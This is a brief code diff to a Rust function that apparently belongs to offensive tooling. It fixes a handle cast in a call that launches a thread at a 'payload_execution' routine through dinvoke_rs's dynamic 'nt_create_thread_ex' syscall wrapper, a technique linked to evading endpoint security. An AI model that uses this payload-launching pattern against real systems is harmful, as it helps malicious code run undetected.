@@ -29,7 +29,7 @@ fn gateway(arg1:u64, arg2:u64, arg3:u64, arg4:u64, arg5:u64, arg6:u64, arg7:u64,
             {
                 let h = HANDLE::default();
                 let handle: *mut HANDLE = std::mem::transmute(&h);
-                let phand = HANDLE(-1);
+                let phand = HANDLE(-1 as _);
                 let thread_start_address = payload_execution as *const();
                 let start_routine: PVOID = std::mem::transmute(thread_start_address);
                 let ret = dinvoke_rs::dinvoke::nt_create_thread_ex(
